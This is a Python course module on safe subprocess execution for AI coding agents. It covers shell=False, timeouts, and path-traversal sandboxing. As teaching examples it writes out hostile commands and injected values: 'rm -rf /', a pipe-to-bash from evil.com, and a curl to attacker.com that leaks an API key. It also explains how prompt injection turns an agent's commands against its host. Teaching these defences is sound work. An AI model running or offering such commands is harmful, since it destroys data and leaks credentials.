# Module 09: Subprocesses, CLI Execution, and Tool Sandboxing

## 1. Learning Objectives
By the end of this module, you will be able to:
- Execute external operating system processes safely using Python's `subprocess.run` and `asyncio.create_subprocess_exec`.
- Explain why `shell=True` enables catastrophic command injection and enforce `shell=False` execution with argument arrays.
- Capture, separate, and decode `stdout`, `stderr`, and return codes from CLI executions.
- Enforce strict wall-clock timeout bounds to prevent runaway or infinite loop processes from hanging the agent.
- Implement a sandboxed tool runner that restricts file writes to an isolated directory and prevents path traversal attacks (`../`).

---

## 2. Why AI Agent Engineers Need This
Autonomous coding agents (e.g. Claude Computer Use, Devin, SWE-bench solvers, and shell execution tools) execute real commands: running tests (`pytest`), building packages, compiling code, and analyzing files.

When an LLM writes shell commands:
1. **Command Injection**: If you pass a user prompt or LLM output to `shell=True`, an injection like `rm -rf /` or `curl evil.com | bash` executes with the agent process's full permissions.
2. **Hanging Processes**: A simple command like `cat` without arguments or a Python script with `while True: pass` will hang forever unless the agent enforces hard process timeouts.
3. **Path Traversal**: An agent instructed to "inspect project files" might read `/etc/passwd` or overwrite `~/.ssh/id_rsa` without sandbox path restrictions.

Mastery of subprocess management and sandboxing is the difference between a secure coding agent and an open backdoor into your infrastructure.

---

## 3. Structured Concept Breakdown

### Concept 1: Subprocess & Execution Model
- **TERM**: Subprocess
- **DEFINITION**: A separate operating system process spawned by a parent Python program to execute a binary executable, possessing its own memory address space, environment, and file descriptors.
- **INTUITION**: Hiring an external contractor. Instead of doing everything yourself inside your office, you dispatch a contractor to execute a task in the workshop, wait for them to finish, and receive their written report.
- **WHY IT EXISTS**: Python cannot natively run Bash scripts, GCC compilers, Git commands, or Docker containers within its own interpreter memory. Spawning a subprocess bridges Python to the host OS.
- **HOW IT WORKS**: The OS kernel forks the current process and invokes `execve()` with the binary path and arguments array. Python communicates through anonymous standard pipes (`stdin`, `stdout`, `stderr`).
- **CODE**:
```python
import subprocess

# Safe execution: executable and arguments passed as an explicit list
result = subprocess.run(
    ["echo", "Hello from agent subprocess!"],
    capture_output=True,
    text=True,
    timeout=5
)
print("Return code:", result.returncode)
print("Output:", result.stdout.strip())
```

---

### Concept 2: Command Injection & `shell=False` Safety
- **TERM**: Command Injection & `shell=False`
- **DEFINITION**: A critical security vulnerability where untrusted user or LLM strings are concatenated into a shell command string, allowing meta-characters (`;`, `&&`, `|`, `` ` ``) to execute arbitrary commands.
- **INTUITION**: A bank teller accepting a deposit slip. If the slip says "Deposit $50; Also transfer $1,000,000 to Account X", a gullible shell executes both instructions. Passing an argument list ensures the entire string is treated strictly as an argument value, not as new commands.
- **WHY IT EXISTS**: In `shell=True`, Python invokes `/bin/sh -c "string"`. The shell parses operators like `;` or `|`. With `shell=False` (the default), Python bypasses the shell entirely, directly passing arguments to the OS kernel `execve`.
- **HOW IT WORKS**:
  - Unsafe: `subprocess.run(f"cat {user_input}", shell=True)` $\rightarrow$ injection vulnerable!
  - Safe: `subprocess.run(["cat", user_input], shell=False)` $\rightarrow$ `user_input` cannot execute new commands.
- **CODE**:
```python
import subprocess

# Attacker tries to inject a second command
user_filename = "doc.txt; id"

# SAFE: 'doc.txt; id' is treated strictly as a single filename argument
result = subprocess.run(["ls", "-l", user_filename], capture_output=True, text=True)
# ls will report: 'ls: cannot access doc.txt; id: No such file or directory'
# It will NOT run the 'id' command!
```

---

### Concept 3: Process Timeout & Signal Termination
- **TERM**: Process Timeout & Termination
- **DEFINITION**: Enforcing a maximum run duration on a spawned process, terminating it via `SIGTERM` (graceful) followed by `SIGKILL` (forced) if it fails to exit in time.
- **INTUITION**: A kitchen timer with an automatic stove shutoff valve. If a pot boils for more than 10 minutes without attention, the gas is cut off immediately.
- **WHY IT EXISTS**: If an LLM generates a Python script containing `while True: time.sleep(1)`, without a timeout the agent hangs indefinitely.
- **HOW IT WORKS**: `subprocess.run(..., timeout=N)` registers a timer. If expired, it raises `subprocess.TimeoutExpired`, kills the child process, and closes the pipe file descriptors.
- **CODE**:
```python
import subprocess

try:
    subprocess.run(["python3", "-c", "import time; time.sleep(100)"], timeout=1.0)
except subprocess.TimeoutExpired as err:
    print(f"Process killed after {err.timeout}s timeout!")
```

---

### Concept 4: Path Traversal Defense & Tool Sandboxing
- **TERM**: Path Traversal Defense
- **DEFINITION**: Validating that all file access paths requested by an agent resolve strictly within a pre-approved root sandbox directory, blocking attempts to escape via `../` or absolute paths.
- **INTUITION**: A fenced playground for children. Children can explore anywhere inside the fenced yard, but the security gate prevents them from wandering onto the highway.
- **WHY IT EXISTS**: LLMs exploring a repository might accidentally or adversarial-prompted generate `cat ../../../etc/shadow`. Resolving the canonical real path prevents escaping the sandbox.
- **HOW IT WORKS**: `os.path.realpath(requested_path)` resolves all symlinks and `..` segments. If the real path does not start with `os.path.realpath(sandbox_dir)`, the request is rejected with a `PermissionError`.
- **CODE**:
```python
import os

def validate_sandboxed_path(sandbox_root: str, target_path: str) -> str:
    root = os.path.realpath(sandbox_root)
    full = os.path.realpath(os.path.join(root, target_path))
    if not (full == root or full.startswith(root + os.sep)):
        raise PermissionError(f"Access denied: '{target_path}' escapes sandbox '{sandbox_root}'")
    return full
```

---

## 4. Real-World Failure Modes & Anti-Patterns in Agents

### Anti-Pattern 1: Concatenating Shell Commands with `shell=True`
- **The Bug**: `subprocess.run(f"python3 {script_name}", shell=True)`.
- **The Consequence**: Prompt injection vulnerability. If `script_name` is `"test.py && curl attacker.com/leak?k=$OPENAI_API_KEY"`, your credentials are stolen.
- **The Fix**: Always use argument arrays: `subprocess.run(["python3", script_name], shell=False)`.

### Anti-Pattern 2: Combining stdout and stderr into a single unformatted stream
- **The Bug**: Setting `stderr=subprocess.STDOUT` without structured tagging.
- **The Consequence**: Trace logs cannot distinguish between standard tool output and warnings/stack traces, confusing the LLM's error-recovery engine.
- **The Fix**: Capture stdout and stderr separately in your agent execution envelopes.

---

## 5. Progressive Exercises

### Tier 1 (Recall)
1. Why is `shell=True` strongly discouraged when executing LLM-generated commands?
2. What exception is raised when `subprocess.run(..., timeout=X)` exceeds its time limit?
3. What return code indicates successful execution in Unix systems?

### Tier 2 (Debugging)
Find the security vulnerability in this tool:
```python
def view_file(user_file):
    os.system(f"cat /home/agent/workspace/{user_file}")
```
*Hint*: What happens if `user_file` is `"; whoami; #"`? Rewrite using safe `subprocess.run()`.

### Tier 3 (Application)
Write a Python function `safe_execute_python_code(code_string: str, timeout: float = 3.0) -> dict` that:
1. Writes the code to an ephemeral temporary file.
2. Executes it with `python3` via `subprocess.run(..., timeout=timeout)`.
3. Returns `{"stdout": ..., "stderr": ..., "exit_code": ..., "timed_out": bool}`.
4. Cleans up the temporary file in all cases.

### Tier 4 (Challenge)
Build a `SandboxedCommandRunner` class that:
- Maintains a designated sandbox directory.
- Whitelists allowed executables (`["git", "pytest", "python3", "ls", "grep"]`).
- Validates all argument paths to ensure they remain inside the sandbox.
- Runs commands asynchronously via `asyncio.create_subprocess_exec`.

---

## 6. Verification & Runnable Scripts
Run the standalone demonstration scripts included in this module:
```bash
python3 course_0_prerequisites/09_subprocesses_and_sandboxing/subprocesses_demo.py
python3 course_0_prerequisites/09_subprocesses_and_sandboxing/sandboxed_runner.py
```
